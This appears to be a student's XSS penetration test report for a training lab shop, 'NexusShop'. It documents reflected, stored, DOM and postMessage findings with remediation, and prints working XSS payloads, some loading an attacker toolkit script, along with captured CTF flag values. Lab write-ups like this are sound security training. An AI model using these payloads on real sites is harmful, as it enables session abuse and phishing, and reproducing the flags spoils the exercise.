# NexusShop — Cross-Site Scripting Penetration Test Report

**Target:** `http://web0x0c.hbtn`  
**Assessment date:** 4 November 2026  
**Assessment type:** Authorized educational web-application penetration test  
**Prepared for:** NexusShop  
**Classification:** Training / Lab  
**Report status:** Evidence-based assessment — five captured flags documented (four verified in GitHub; Level 7 captured directly in the lab); remaining evidence gaps explicitly identified

---

## 1. Executive Summary

The NexusShop e-commerce platform was assessed for reflected, stored, and DOM-based Cross-Site Scripting (XSS) through the lab's Tasks 0–6. **Five distinct workflows had confirmed JavaScript execution:** product reviews, user profiles, Markdown product editing, product-page URL hashes, and cart `postMessage` handling. These findings demonstrate that attacker-controlled content can cross into active browser contexts, potentially allowing account actions, data access, or phishing in a victim's authenticated session. Other stages were blocked, incomplete, or not independently verified; therefore **the assessment does not claim eight confirmed vulnerabilities**.

The lab labels the report-writing exercise as **Task 7**. It is documented below as a reporting deliverable, not misrepresented as an eighth exploitable endpoint. Severity ratings reflect realistic potential impact rather than a claim that production accounts were compromised.

### Scope and method

- Application origin: `http://web0x0c.hbtn`
- In scope: search results, product sort controls, product reviews, user profile fields, administrative product Markdown editor, URL-fragment-driven product sections, and cart `postMessage` handling.
- Methods: browser DevTools inspection, safe JavaScript execution probes, persistence/reload checks, review of generated markup and DOM sinks, and the lab's attacker toolkit/C2 tracking interface.
- Evidence standard: **Confirmed** means execution or C2 activity was reported during the exercise. **Unconfirmed** means a payload was proposed or tried without a recorded successful execution. **Blocked** means controls prevented the tested payload from executing.
- Limitations: raw C2 exports, screenshots, and some exact final payload strings were not preserved in the available assessment notes. Four flag literals (`0-flag.txt`, `3-flag.txt`, `4-flag.txt`, and `6-flag.txt`) were recovered from the assessment repository, and the Level 7 flag was captured directly from the laboratory after the final `postMessage` stage. The `0-flag.txt` file corresponds to the first exercise (Task 0), although its exact successful payload and C2 record were not available. No cookie, credential, or keystroke exfiltration is asserted unless observed.

### Assessment overview

| Task | Exercise / finding | Relevant stage(s) | Severity / confidence | Result |
|---|---|---|---|---|
| 0 | Reflected XSS — Basic Search | Search / filtered / advanced | High / flag captured; payload unverified | `0-flag.txt` confirms a captured flag for the first exercise; final working payload and C2 record not retained |
| 1 | Reflected XSS — JavaScript Context | Sort / dynamic / advanced | Informational / blocked in tested stage | JavaScript-string breakout did **not** execute with observed entity encoding |
| 2 | Stored XSS — Product Reviews | Product reviews (especially Stage 3) | **High / confirmed** | Persisted author-name injection executed; C2 Level 3/Stage 3; flag verified in repository |
| 3 | Stored XSS — User Profile | Profile / settings / edit | **High / confirmed** | C2 Level 4/Stages 1–3; Stage 3 flag verified in repository |
| 4 | Stored XSS — Markdown Editor | Admin product edit | **High / confirmed** | C2 Level 5/Stages 1–2; Stage 3 filtered tested payloads |
| 5 | DOM XSS — URL Hash Hijack | Product / gallery / specs | **High / confirmed** | C2 Level 6/Stages 1–3; flag verified in repository following recorded link activation |
| 6 | DOM XSS — `postMessage` Abuse | Cart / checkout / payment | **High / confirmed** | Level 7 Stages 1–3 completed; C2 token and tracking verified; Stage 3 flag captured |
| 7 | Penetration Test Report | `SECURITY_REPORT.md` | N/A | Documentation deliverable; not a separate vulnerability |

### Flags Captured

Five captured flags are documented: four retrieved from the repository (`0-flag.txt`, `3-flag.txt`, `4-flag.txt`, and `6-flag.txt`) and one returned by the completed Level 7 laboratory challenge. Their **exact 32-character values** appear below without an invented `FLAG{}` wrapper. `0-flag.txt` corresponds to the first exercise (Task 0 / Level 1). Other expected flag files were not found, and additional flags are not claimed.

| Task / Level | Flag | Vulnerability | Verification |
|---|---|---|---|
| Task 0 / Level 1 | `b289f23db7f2dd3b7c04588934a2b089` | Reflected XSS — Search | `0-flag.txt` verified in GitHub; successful payload not retained |
| Task 1 / Level 2 | Not recorded | Reflected XSS — JavaScript Context | Not confirmed |
| Task 2 / Level 3 | `c74d8c659e5c25deb2a7dceaf76cb3bc` | Stored XSS — Reviews | Flag file verified in GitHub |
| Task 3 / Level 4 | `a1a89d8fb5a661fd5fefa4aeaaf14e8f` | Stored XSS — Profile | Flag file verified in GitHub |
| Task 4 / Level 5 | Not recorded | Stored XSS — Markdown | Stage 3 flag not confirmed |
| Task 5 / Level 6 | `06c22d73678e4a15c26571ec01ea814e` | DOM XSS — URL Hash | Flag file verified in GitHub |
| Task 6 / Level 7 | `fbb964c979ed04139232968daa12174d` | DOM XSS — `postMessage` | Captured from completed Stage 3 in lab; C2 and tracking observed |
| Task 7 | Not applicable | Report writing | No flag associated with this task |


**Flag evidence (primary repository sources):**

- Task 0 / first exercise: [`0-flag.txt`](https://github.com/ewirtz05/dlh-cyber_security/blob/main/web_application_security/websec_0x0C/0-flag.txt)
- Level 3: [`3-flag.txt`](https://github.com/ewirtz05/dlh-cyber_security/blob/main/web_application_security/websec_0x0C/3-flag.txt)
- Level 4: [`4-flag.txt`](https://github.com/ewirtz05/dlh-cyber_security/blob/main/web_application_security/websec_0x0C/4-flag.txt)
- Level 6: [`6-flag.txt`](https://github.com/ewirtz05/dlh-cyber_security/blob/main/web_application_security/websec_0x0C/6-flag.txt)
- Level 7: [`7-flag.txt`](https://github.com/ewirtz05/dlh-cyber_security/blob/main/web_application_security/websec_0x0C/7-flag.txt)

---

## 2. Detailed Vulnerability Findings

## Task 0: Reflected XSS — Basic Search

### Vulnerability Description

The search workflow was designed to test reflection of user-controlled `q` input into the resulting HTML. If the page interpolates the query into an HTML or attribute context without appropriate output encoding, a specially crafted search link can execute JavaScript in the victim's browser. Three increasingly restrictive search stages were part of the lab. **The first exercise’s flag was captured and verified in `0-flag.txt`, but its exact successful payload and browser/C2 execution trace were not retained.**

**Expected source → sink:** URL query string `q` → server-generated search response → HTML parser/DOM. The exact executable sink must be confirmed in the rendered response before labeling the vulnerability verified.

### Location & Parameters

| Attribute | Details |
|---|---|
| **URLs** | `/search?q=`, `/search/filtered?q=`, `/search/advanced?q=&min_price=&max_price=` |
| **Parameter/Field** | `q` (search query); advanced price parameters provide additional filtering context |
| **Type** | Reflected XSS candidate |
| **Severity** | High (potential impact); flag confirmed, execution details not independently reproduced |

### Attack Vector

1. Enter a distinctive string as `q`; inspect where it appears in the HTML or DOM.
2. Test a benign script marker in the basic search results.
3. In Stage 2, test whether filtering `<script>` tags still allows an event-handler payload.
4. In Stage 3, test whether SVG/animation syntax survives the revised filter.
5. Correlate the captured `0-flag.txt` flag with the original `/search/api/track` response and lab C2 event if available; the flag is verified but these artifacts were not preserved.

### Payload Used

The following are **representative test patterns from the exercise, not claimed successful payloads**. The final successful byte-for-byte payloads were not retained.

**Stage 1 — Script element probe:**

```html
<script>document.title='SEARCH_STAGE1_TEST'</script>
```

**Stage 2 — Event handler probe:**

```html
<img src=x onerror="document.title='SEARCH_STAGE2_TEST'">
```

**Stage 3 — SVG animation probe:**

```html
<svg><animate attributeName="x" from="0" to="1" dur="1s" onbegin="document.title='SEARCH_STAGE3_TEST'"></animate></svg>
```

### Evidence

The stage URLs, filtering differences, and tracking endpoint `/search/api/track` were available in the assignment. The captured flag is verified from the GitHub file [`0-flag.txt`](https://github.com/ewirtz05/dlh-cyber_security/blob/main/web_application_security/websec_0x0C/0-flag.txt): `b289f23db7f2dd3b7c04588934a2b089`. The exact payload, C2 event, and tracking response for this task were not retained. **Status: Flag capture confirmed; underlying XSS execution evidence incomplete.**

### Real-World Impact

If verified, an attacker could send a crafted search URL that runs JavaScript when a customer opens it. That code could alter page content, display a counterfeit sign-in form, read accessible page data, or perform actions through the victim's session. Readable session cookies could be exposed only if their attributes permit script access (for example, without `HttpOnly`).

### Remediation

- HTML-escape search terms when rendering them into HTML text (`{{ q }}` with template autoescaping; never `{{ q | safe }}` for untrusted input).
- For DOM insertion, use `element.textContent = q`, not `innerHTML`.
- Apply separate context-specific escaping to attributes, URLs, and JavaScript; do not rely on a universal blacklist.
- Validate numerical `min_price`/`max_price` for type and range, but do not mistake input validation for output encoding.

## Task 1: Reflected XSS — JavaScript Context

### Vulnerability Description

The product-sort flow places the `by` query-string parameter into JavaScript associated with product sorting. The attack hypothesis was to escape the quoted JavaScript string and append executable code. In the observed deployment, the apostrophe was HTML-entity encoded inside the script text, so the tested quote-breakout remained a literal string instead of executable syntax. **A vulnerability at this stage was not demonstrated.**

**Observed source → sink:** `by` → server-generated `currentSort` JavaScript string → JavaScript parser. Encoding and parser context determined whether the payload remained data or became code.

### Location & Parameters

| Attribute | Details |
|---|---|
| **URLs** | `/products/sort?by=`, `/products/sort/dynamic?by=`, `/products/sort/advanced?by=` |
| **Parameter/Field** | `by` |
| **Type** | Reflected JavaScript-context XSS candidate |
| **Severity** | Informational (attempt blocked; no confirmed execution) |

### Attack Vector

1. Inspect the product page source and locate the string assigned to `currentSort`.
2. Submit a single quote followed by a benign JavaScript statement and a comment marker to attempt to exit the string.
3. Compare raw response source with live `window.currentSort` and console behavior.
4. Observe the tracking endpoint independently: a manual toolkit callback does not establish that an injected payload executed.
5. Avoid treating hypothetical Stage 2/3 bypasses as successful without proof.

### Payload Used

**Stage 1 — Exact tested breakout:**

```text
';console.log("XSS_STAGE1_SUCCESS");//
```

**Observed server-side response fragment:**

```javascript
var currentSort = '&#39;;console.log(1337);//';
```

The `&#39;` text was found in the runtime variable as a literal sequence, not as an apostrophe that would terminate the quoted JavaScript string. A `</script><script>...</script>` breakout was discussed for a later stage, but no successful exact payload was recorded for Stage 2 or 3.

### Evidence

- Browser inspection showed `window.currentSort` contained literal `&#39;`; the candidate string was not executed.
- A Level 2/Stage 1 C2 capture existed only for **manual toolkit execution**; its observed `document.cookie`, localStorage, and sessionStorage fields were empty. This does **not** prove injection-driven execution or theft.
- `/products/sort/api/track` returned `{"status":"error"}` for the tested token.
- No Level 2 flag was confirmed. **Status: Blocked/not confirmed.**

### Real-World Impact

If an unsafe inline JavaScript interpolation were exploitable, a reflected link could run code on the site's origin. This was **not shown in the tested build**. The manual C2 call illustrates the capabilities of code already running in the browser, not evidence that `by` provided such execution.

### Remediation

- Do not place URL parameters directly inside executable inline `<script>` blocks.
- Transfer initial page data in a safe JSON data element (for example `<script type="application/json">` with safe serialization) and read it via `textContent`, or supply it through a JSON endpoint.
- Use a strict sort-key allowlist such as `price_asc`, `price_desc`, `name`; reject everything else.
- Use framework-provided JavaScript-safe serialization rather than HTML escaping alone; ensure `<`, `</script`, and special characters cannot terminate a script container.
- Maintain automated regression tests covering quotes, backslashes, HTML entities, and script-closing sequences.

## Task 2: Stored XSS — Product Reviews

### Vulnerability Description

Product reviews accept input that is persisted and rendered to other viewers. The basic stages focused on unsafe review-body rendering, whereas Stage 3 presented a **different vulnerable field: the reviewer's `name`**. An HTML payload in the author-name field executed when reviews were rendered. Refreshing the page confirmed the injected value persisted.

**Source → sink:** review submission `name` → stored review record → author-name markup on `/product/1/reviews/all` → browser HTML parser/event-handler execution.

### Location & Parameters

| Attribute | Details |
|---|---|
| **URLs** | `/product/1/reviews`, `/product/1/reviews/verified`, `/product/1/reviews/all` |
| **Parameter/Field** | `review` body in early stages; **`name`** in Stage 3; `rating` was also inspected |
| **Type** | Stored XSS |
| **Severity** | **High — confirmed** |

### Attack Vector

1. Open the review submission form and identify the `name`, `rating`, and `review` inputs.
2. Use Stage 1/2 to study how the review body is filtered.
3. In Stage 3, submit an innocuous review while placing an event-handler payload in `name` instead of `review`.
4. Reload the reviews page; verify that the injected HTML remains in the persisted author name and executes.
5. Run the lab toolkit in that context and correlate Level 3/Stage 3 C2 records with `/product/reviews/api/track`.

### Payload Used

**Stage 3 — Confirmed execution probe in `name`:**

```html
<img src=x onerror="document.title='XSS_STAGE3_SUCCESS'">
```

**Stage 3 — C2 tracking form reconstructed from the recorded callback (exact final submitted bytes not preserved):**

```html
<img src=x onerror="this.onerror=null;let s=document.createElement('script');s.src='/attacker/toolkit.js';s.onload=()=>XSS.pwn(3,3,'/product/reviews/api/track');document.head.append(s)">
```

No exact successful Stage 1/2 payload strings were preserved; they are not presented as confirmed.

### Evidence

- The author-name probe changed `document.title` to `XSS_STAGE3_SUCCESS`.
- Execution recurred after refresh, establishing persistence.
- C2 showed **Level 3 / Stage 3** records, and the corresponding captured flag is stored in the linked repository.
- An earlier direct tracking probe returned `{"status":"error"}`; this should not be substituted for the later reported successful stage completion.
- Verified flag (source: `3-flag.txt`): `c74d8c659e5c25deb2a7dceaf76cb3bc`. C2 screenshots were not retained. **Status: Confirmed stored XSS.**

### Real-World Impact

Any visitor who reads the affected reviews could execute the stored payload, including staff reviewing product feedback. In production, an attacker could modify product information displayed to customers, display a fake payment or login prompt, read non-`HttpOnly` browser data, or issue authenticated same-origin requests within the victim's permissions. Persistence increases reach because the attacker does not need every victim to open a custom URL.

### Remediation

- Treat **all** review fields, including `name` and metadata, as untrusted; encode values at the output sink.
- Render names using `textContent` or a template with autoescaping; do not concatenate author names into HTML.
- Render review bodies as text, or sanitize HTML with a maintained allowlist-based sanitizer if rich text is genuinely required.
- Validate name length and permitted characters for data quality, but retain output escaping as the primary XSS defense.
- Add regression tests for image tags and event handlers in both review text and author names.

## Task 3: Stored XSS — User Profile

### Vulnerability Description

The profile application stores and renders editable user details. Inspection found that profile values such as `username`, `bio`, `location`, and `website` were assigned to the DOM via unsafe `innerHTML` operations. At least one alternative field remained exploitable when filtering was added to the more obvious bio input. C2 activity was confirmed for all three stages.

**Source → sink:** profile form/API (`/profile/api/update`) → stored profile attributes (`/profile/api/data`) → `innerHTML` render operations → browser HTML parser and event handler.

### Location & Parameters

| Attribute | Details |
|---|---|
| **URLs** | `/profile`, `/profile/settings`, `/profile/edit` |
| **Parameter/Field** | `bio` and other profile attributes (`username`, `location`, `website`) |
| **Type** | Stored/DOM-rendered XSS |
| **Severity** | **High — confirmed** |

### Attack Vector

1. Inspect the profile editor and requests to `/profile/api/data` and `/profile/api/update`.
2. Enter a benign HTML event-handler test in `bio`, save, and load the profile page.
3. Test subsequent stages after filters are added, checking **every** field that is later rendered with `innerHTML`.
4. Verify script execution with a browser-visible marker and the lab's `XSS.pwn(4, stage, '/profile/api/track')` mechanism.
5. Compare C2 stage numbers with the profile stage, then retrieve the associated flag through the lab flow.

### Payload Used

**Stage 1 — Profile bio test pattern:**

```html
<img src=x onerror="document.title='PROFILE_XSS_STAGE1'">
```

**Stage 2 — Profile bio test pattern:**

```html
<img src=x onerror="document.title='PROFILE_XSS_STAGE2'">
```

**Stage 3 — Documented candidate for alternative `username` field:**

```html
<img src=x onerror="document.title='PROFILE_XSS_STAGE3'">
```

**Recorded C2 callback pattern:**

```javascript
XSS.pwn(4, 3, '/profile/api/track');
```

**Evidence qualification:** The exact winning Stage 3 field and the byte-for-byte final Stage 3 injection string were not preserved; the candidate above must not be mistaken for a verified final-stage payload on its own.

### Evidence

- Stage 1 bio injection generated C2 **Level 4 / Stage 1**, with tracking recorded.
- Stage 2 generated C2 **Level 4 / Stage 2**.
- Stage 3 generated C2 **Level 4 / Stage 3**, and the repository contains the corresponding captured flag.
- The code inspection finding was that multiple untrusted profile values reached `innerHTML`.
- Verified flag (source: `4-flag.txt`): `a1a89d8fb5a661fd5fefa4aeaaf14e8f`. The exact successful Stage 3 input and C2 screenshots were not retained. **Status: Confirmed stored/DOM XSS.**

### Real-World Impact

A malicious profile could compromise viewers of that profile and potentially administrators moderating users. Victim-side JavaScript can read data available to the page, modify forms, present a deceptive authentication step, and send authorized same-origin requests. The breadth of affected profile fields means fixing only the `bio` validator would leave another injection pathway.

### Remediation

- Replace `element.innerHTML = profile.username` and analogous assignments with `element.textContent = ...` for plain-text fields.
- If `bio` supports formatting, sanitize it as HTML with a maintained allowlist and render it only in approved rich-text containers.
- For `website`, parse with `new URL(value)` and allow only `http:`/`https:` before setting an anchor's `href` through DOM APIs; display the link text using `textContent`.
- Use shared rendering components to enforce consistent protection across `username`, `bio`, `location`, and `website`.
- Regression-test each profile field separately, including persisted values displayed on another user's page.

## Task 4: Stored XSS — Markdown Editor

### Vulnerability Description

The administrative product editor accepts Markdown that is transformed into rendered HTML. Stages 1 and 2 permitted injected HTML image elements with event handlers, allowing stored code execution when the product content was rendered. Stage 3 applied stricter sanitization; the tested HTML, SVG, and dangerous URL variants were escaped, removed, or had their event handlers stripped. **Stage 3 exploitation was not confirmed.**

**Source → sink:** Markdown product editor input → stored content → Markdown-to-HTML conversion/sanitization → HTML render sink → event-handler execution (Stages 1–2).

### Location & Parameters

| Attribute | Details |
|---|---|
| **URLs** | `/admin/products/1/edit`, `/admin/products/1/edit/safe`, `/admin/products/1/edit/strict` |
| **Parameter/Field** | Product Markdown/description editor; exact HTML form field name was not retained |
| **Type** | Stored XSS through unsafe Markdown rendering |
| **Severity** | **High — confirmed for Stages 1–2** |

### Attack Vector

1. Edit the product's Markdown/description and save an HTML image-element payload.
2. Visit the rendered output and confirm that the `onerror` handler runs rather than appearing as literal text.
3. Use the lab toolkit to record each executed stage.
4. Re-test under Stage 3, checking how the sanitizer handles event handlers, HTML/SVG, and unsafe link schemes.
5. Do not claim Stage 3 success unless the rendered sanitized output contains an executable pathway and the correct C2/flag result.

### Payload Used

**Stage 1 — C2 execution confirmed:**

```html
<img src=x onerror="this.onerror=null;let s=document.createElement('script');s.src='/attacker/toolkit.js';s.onload=()=>XSS.pwn(5,1);document.head.append(s)">
```

**Stage 2 — C2 execution confirmed:**

```html
<img src=x onerror="this.onerror=null;let s=document.createElement('script');s.src='/attacker/toolkit.js';s.onload=()=>XSS.pwn(5,2);document.head.append(s)">
```

**Stage 3 — Tested patterns that did not execute:**

```html
<img src=x onerror="document.title='MARKDOWN_STAGE3_TEST'">
<a href="javascript:alert(1)">Link test</a>
```

The examples above illustrate the tested handler and protocol classes; the exact combined Stage 3 input sequence was not retained.

### Evidence

- C2 recorded **Level 5 / Stage 1** and **Level 5 / Stage 2** execution.
- Stage 3 suppressed `<img onerror>`, removed `javascript:` link destinations, and escaped or stripped additional HTML/SVG/iframe/event-handler candidates.
- No successful Stage 3 payload or Level 5 flag was recorded. **Status: Vulnerable in Stages 1–2; tested Stage 3 payloads blocked.**

### Real-World Impact

A person able to edit product descriptions could create a persistent payload targeting customers or shop administrators who preview or review the product page. In a production shop, script execution could manipulate displayed prices or checkout instructions, insert fake payment forms, or act using the permissions of the viewing account. The impact depends on who can edit the content and who views it.

### Remediation

- Perform Markdown conversion using a trusted parser and sanitize the resulting HTML with a maintained, allowlist-based sanitizer such as DOMPurify.
- Disable raw HTML in Markdown unless explicitly required.
- Remove all inline event-handler attributes and disallow active content (`script`, `iframe`, SVG, unsafe URL schemes) from user-controlled rendered content.
- Permit only safe URL protocols (`https:`, `http:` and any specifically required schemes) in links and images.
- Apply identical sanitization to previews, live product pages, and editor re-rendering; use Stage 3-like behavior as the baseline for all stages.

## Task 5: DOM XSS — URL Hash Hijack

### Vulnerability Description

Product pages read text from the fragment identifier (`location.hash`) and insert decoded content into the section heading using `innerHTML`. Because the fragment is client-side and not sent as part of a normal HTTP request, server-side parameter filtering alone cannot protect this sink. In Stages 1 and 2 an image-event payload executed; Stage 3 was exploited via an injected `javascript:` hyperlink activated by a click.

**Source → sink:** `location.hash` → `decodeURIComponent(location.hash.slice(1))` → `#section-title.innerHTML` → HTML parser/event handler or attacker-controlled link URL.

### Location & Parameters

| Attribute | Details |
|---|---|
| **URLs** | `/product/1#...`, `/product/1/gallery#...`, `/product/1/specs#...` |
| **Parameter/Field** | URL fragment identifier following `#` |
| **Type** | DOM-based XSS |
| **Severity** | **High — confirmed**, with user interaction required for the observed Stage 3 link path |

### Attack Vector

1. Inspect how the product page obtains and decodes the fragment.
2. Set the fragment to URL-encoded HTML and check whether the section title renders it as markup.
3. For Stages 1 and 2, use image error handlers as execution probes and confirm Level 6 C2 events.
4. For Stage 3, use a `javascript:` link in the rendered fragment and activate the link in the lab browser.
5. Verify `XSS.pwn(6,3,'/product/api/track')` and the returned flag through the stage's tracker.

### Payload Used

**Stages 1–2 — Browser-visible execution probes:**

```html
<img src=x onerror="document.title='DOM_XSS_STAGE1'">
<img src=x onerror="document.title='DOM_XSS_STAGE2'">
```

These probes were placed into the page fragment after URL encoding. The lab C2 variant loaded `/attacker/toolkit.js` and invoked `XSS.pwn(6,1)` or `XSS.pwn(6,2)`.

**Stage 3 — Recorded successful DevTools payload:**

```javascript
(() => {
  const code = `void((()=>{ let s=document.createElement('script'); s.src='/attacker/toolkit.js'; s.addEventListener('load',()=>{ XSS.pwn(6,3,'/product/api/track'); }); document.head.append(s); })())`;
  const payload = `<a href="javascript:${code}">CLAIM_STAGE3_FLAG</a>`;
  location.hash = encodeURIComponent(payload);
})();
```

The injected **CLAIM_STAGE3_FLAG** link was then clicked. Encoding the fragment only transports the payload safely in the URL; it does **not** make rendering with `innerHTML` secure.

### Evidence

- Level 6 / Stages 1–3 generated C2 executions.
- Stage 3 used a clickable `javascript:` anchor rather than an automatically firing handler.
- The confirmed tracking endpoint was `/product/api/track`, and the repository contains the corresponding captured Stage 3 flag.
- Verified flag (source: `6-flag.txt`): `06c22d73678e4a15c26571ec01ea814e`. **Status: Confirmed DOM XSS.**

### Real-World Impact

An attacker could distribute a crafted product link whose fragment alters the visible page or injects active content. Depending on the variant, JavaScript may execute on page load or after a misleading user click. An affected user could be redirected to fraudulent purchase flows, exposed to malicious overlays, or have authorized actions performed on their behalf. Fragment-based attacks may evade server-side request logs because the hash is usually not sent in HTTP requests.

### Remediation

- Replace `document.getElementById('section-title').innerHTML = hash` with `.textContent = hash` when the section title is plain text.
- If a section navigation link must be built, create elements through DOM APIs and allowlist only valid internal section names.
- Never copy user-controlled URL fragments into `href` without parsing and an explicit protocol allowlist; reject `javascript:` and `data:` schemes.
- Add browser-side tests for encoded HTML tags, entity variants, and unsafe URL protocols on all three product routes.

## Task 6: DOM XSS — `postMessage` Abuse (Level 7)

### Vulnerability Description

The NexusShop cart flow listens for browser `message` events and displays their content in the **Special Offers** widget. The receiver fails to establish an adequate trust boundary for incoming messages and treats attacker-controlled content as HTML. Stages 1 and 2 allowed an HTML event-handler payload to execute; Stage 3 required an object with `type: "widget-update"` and `content`, then removed `<script>` elements and `on*=` handlers but still accepted an `href="javascript:..."` URL. After clicking the injected link, JavaScript executed within the NexusShop page context.

**Confirmed source → sink:** `window.postMessage({type: 'widget-update', content: ...}, '*')` → page `message` handler → partial HTML filtering without a sufficient URL-scheme policy → `#widget-message.innerHTML` → rendered `javascript:` anchor → user click → JavaScript execution → `/attacker/toolkit.js` → `XSS.pwn(7,3,'/cart/api/track')`.

The in-browser proof of concept confirmed code execution in the lab. The prior console-based test did not independently demonstrate that an unrelated origin could reach the same victim window, so that delivery scenario remains a potential external attack path rather than a separately verified cross-origin exploit.

### Location & Parameters

| Attribute | Details |
|---|---|
| **URLs** | `/cart` (Stage 1), `/cart/checkout` (Stage 2), `/cart/payment` (Stage 3) |
| **Parameter/Field** | `MessageEvent.data.content`; Stage 3 also requires `MessageEvent.data.type = "widget-update"` |
| **DOM sink** | Special Offers widget: `#widget-message.innerHTML` |
| **Type** | DOM-based XSS / unsafe `postMessage` handling |
| **Severity** | **High — confirmed in laboratory (Levels 7 / Stages 1–3)** |

### Attack Vector

1. Open `/cart` and inspect the Special Offers update triggered by a `message` event.
2. In Stage 1, send an object containing an HTML image element with an `onerror` handler via `window.postMessage()`. The injected handler loads the lab toolkit and triggers `XSS.pwn(7,1,'/cart/api/track')`.
3. Repeat on `/cart/checkout` for Stage 2. Although literal `<script>` elements are filtered, an image error-handler remains an execution path; trigger `XSS.pwn(7,2,'/cart/api/track')`.
4. On `/cart/payment` (Stage 3), use the required `{type: 'widget-update', content: ...}` object and place an anchor with a `javascript:` URL in `content`. The filter strips `<script>` and `on*=` patterns but leaves the dangerous URL scheme intact.
5. Click the injected **CLAIM_STAGE3_FLAG** link; the JavaScript URL dynamically loads `/attacker/toolkit.js` and calls `XSS.pwn(7,3,'/cart/api/track')`.
6. Verify the tracking ID and requests in DevTools, observe the C2 Level 7/Stage 3 result, and collect the returned flag.

### Payload Used

**Stage 1 — `/cart`:**

```javascript
window.postMessage({
  content: `<img src=x onerror="this.onerror=null;let s=document.createElement('script');s.src='/attacker/toolkit.js';s.addEventListener('load',()=>XSS.pwn(7,1,'/cart/api/track'));document.head.append(s)">`
}, '*');
```

**Stage 2 — `/cart/checkout`:**

```javascript
window.postMessage({
  content: `<img src=x onerror="this.onerror=null;let s=document.createElement('script');s.src='/attacker/toolkit.js';s.addEventListener('load',()=>XSS.pwn(7,2,'/cart/api/track'));document.head.append(s)">`
}, '*');
```

**Stage 3 — `/cart/payment`:**

```javascript
const code = `void((()=>{ let s=document.createElement('script'); s.src='/attacker/toolkit.js'; s.addEventListener('load',()=>{ XSS.pwn(7,3,'/cart/api/track'); }); document.head.append(s); })())`;

window.postMessage({
  type: 'widget-update',
  content: `<a href="javascript:${code}">CLAIM_STAGE3_FLAG</a>`
}, '*');

// Click the injected link in the Special Offers widget to execute Stage 3.
```

The `javascript:` link was used because the Stage 3 filter targeted script tags and inline `on*` handlers but did not enforce a safe URL protocol. The wildcard `'*'` above is part of the local test sender; a secure application's sender should normally specify the intended target origin.

### Evidence

- The user confirmed **Level 7, Stage 1 and Stage 2 completion**. Tracking requests to `/cart/api/track` returned HTTP **200** with `{"status":"tracked"}`.
- C2 displayed the **Level 7 / Stage 3** event. DevTools inspection showed the element `#tracking-id` contained token `bqMaxFNk37MBgybjRxqqDA`.
- A browser-resource check reported **three tracking requests** and `allTokensMatch = true`, corroborating consistent use of the displayed token. An earlier Stage 3 tracking attempt returned an error; subsequent confirmation and the flag establish the eventual successful stage completion.
- **Captured Stage 3 flag:** `fbb964c979ed04139232968daa12174d`.
- No screenshot or C2 export showing cookies, credentials, or keystrokes was retained, so **no such data theft is claimed**.

**Status: Confirmed DOM-based XSS, all three stages completed.** The flag was captured in the lab interaction; a corresponding repository flag file was not independently verified.

### Real-World Impact

If an attacker can cause a crafted `message` to reach a victim's cart or checkout tab, the vulnerable listener can render attacker-controlled markup in the site's origin. The Stage 3 execution path requires activation of the malicious link, but a misleading link in the Special Offers widget could plausibly induce that click. Once code executes, an attacker could impersonate cart offers, alter visible checkout details, show a fake payment or credential prompt, access non-HttpOnly data available to page scripts, or initiate authenticated application requests in the victim's context. Actual session-cookie, credential, or payment theft **was not tested or demonstrated**.

### Remediation

- **Check `event.origin`** against a strict list of allowed origins and, where feasible, verify `event.source` against the intended window/iframe. Do not grant trust solely because a message has the expected shape.
- **Validate the complete message schema:** require `type === 'widget-update'`, a bounded text `content` value, and reject unknown/invalid fields. Schema validation is necessary but not sufficient for XSS prevention.
- **Use `textContent`** for messages intended as plain text: `document.getElementById('widget-message').textContent = data.content`.
- When rich markup is genuinely required, sanitize HTML with a maintained allowlist **and forbid executable schemes**, especially `javascript:` and `data:`, on any link or navigable attribute.
- Add regression tests for HTML event handlers, malformed attributes, `javascript:` links, spoofed `origin` values, and unexpected message types on all cart stages.
- Configure a restrictive CSP as defense in depth; it must not substitute for eliminating unsafe HTML sinks and inadequate message-origin checks.

## Task 7: Penetration Test Reporting and Evidence Management

**Classification:** Deliverable, not an additional XSS vulnerability.

### Vulnerability Description

The lab's Task 7 requires a professional security report. It does not supply an eighth exploitable endpoint, so it is inappropriate to invent a vulnerability, sink, C2 event, or flag for it.

### Location & Parameters

| Attribute | Details |
|---|---|
| **URL** | Not applicable — report artifact `SECURITY_REPORT.md` |
| **Parameter/Field** | Not applicable |
| **Type** | Reporting and evidence preservation |
| **Severity** | Not applicable |

### Attack Vector

1. Consolidate Tasks 0–6 by source, sink, stage, and observed outcome.
2. Separate tested, blocked, and successful payloads.
3. Record confirmed C2 observations and identify unsupported impact claims.
4. Produce this Markdown report, recording verified flags and identifying screenshots and other outstanding evidence.

### Payload Used

Not applicable. No Task 7 exploit payload exists in the provided exercise description.

### Evidence

This `SECURITY_REPORT.md` is the Task 7 artifact. The unresolved evidence items are listed in the submission checklist below.

### Real-World Impact

Accurate reporting allows developers and risk owners to prioritize verified issues and reproduce them. Inflated findings or invented C2 data would impair remediation and undermine the reliability of the assessment.

### Remediation

Maintain an evidence log per finding with a timestamp, exact submitted request/payload, browser/DOM observation, C2 event identifier, tracker response, flag value (where relevant), and screenshot reference.

---

## 3. Remediation Summary

| Priority | Remediation action | Main affected tasks | Practical acceptance criterion |
|---|---|---|---|
| **P1 — High** | Replace unsafe `innerHTML` with `textContent` for plain-text data | 2, 3, 5, 6 | Injected `<img>` appears as text, never as a DOM element or handler |
| **P1 — High** | Encode all stored user-generated fields at output, not only primary content fields | 2, 3 | Author names, usernames, biographies, and metadata cannot create active HTML |
| **P1 — High** | Sanitize rendered Markdown with a maintained allowlist; disable arbitrary embedded HTML | 4 | Product descriptions cannot preserve event handlers, active elements, or unsafe URLs |
| **P1 — High** | Validate URL schemes when creating links from fragment/profile data | 3, 5 | `javascript:` and `data:` URLs are rejected |
| **P1 — High** | Validate `postMessage` origins and message schemas; render received text safely | 6 | Cross-origin forged messages are ignored; accepted data never reaches unsafe HTML sinks |
| **P2 — Medium** | Avoid embedding untrusted data in executable JavaScript; safely serialize configuration | 1 | Quotes, entities, and `</script>` remain data across all stages |
| **P2 — Medium** | Enable template autoescaping and context-aware DOM rendering | 0, 1, 2 | Query parameters and user content render as inert data |
| **P2 — Medium** | Add a restrictive Content Security Policy (CSP), preferably nonce/hash-based scripts and no unsafe inline handlers | All | Inline-event probes are blocked as additional defense; CSP violations are monitored |
| **P2 — Medium** | Set session cookies to `HttpOnly`, `Secure` under HTTPS, and suitable `SameSite` | All | Session cookies are inaccessible to `document.cookie`; authenticated action abuse is still separately mitigated |
| **P2 — Medium** | Add regression tests and security telemetry for every source-to-sink boundary | All | Each recorded payload class is covered by automated tests and audit evidence |

